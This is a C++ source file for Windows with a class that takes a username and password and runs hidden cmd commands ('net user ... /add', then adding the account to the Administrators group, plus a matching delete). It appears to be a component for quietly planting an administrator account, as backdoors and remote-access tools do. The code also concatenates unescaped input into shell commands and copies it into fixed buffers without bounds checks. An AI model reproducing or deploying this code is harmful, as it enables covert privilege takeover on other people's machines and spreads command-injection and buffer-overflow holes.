#include "stdafx.h"
#include "UserOperate.h"


UserOperate::UserOperate(){
	ZeroMemory(username, 256);
	ZeroMemory(userpass, 256);
}

BOOL UserOperate::GetUserPass(CHAR *name, CHAR *pass) {
	if ((lstrlenA(name) <= 0) && lstrlenA(pass) <= 0) {
		return FALSE;
	}
	memcpy(username, name, lstrlenA(name));
	memcpy(userpass, pass, lstrlenA(pass));
	return TRUE;
}

BOOL UserOperate::UserCreate(VOID) {
	CHAR command[256];

	//add new user
	memset(command, 0, 256);
	lstrcatA(command, "/c net user ");
	lstrcatA(command, username);
	lstrcatA(command, " ");
	lstrcatA(command, userpass);
	lstrcatA(command, " /add");
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		command,
		NULL,
		SW_HIDE
	);

	//add localgroup Administratros
	memset(command, 0, 256);
	lstrcatA(command, "/c net localgroup Administrators ");
	lstrcatA(command, username);
	lstrcatA(command, " ");
	lstrcatA(command, " /add");
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		command,
		NULL,
		SW_HIDE
	);
	return TRUE;
}

BOOL UserOperate::UserDel(VOID) {
	CHAR command[256];

	memset(command, 0, 256);
	lstrcatA(command, "/c net user ");
	lstrcatA(command, username);
	lstrcatA(command, " /del");
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		command,
		NULL,
		SW_HIDE
	);
	return TRUE;
}


UserOperate::~UserOperate(){
}
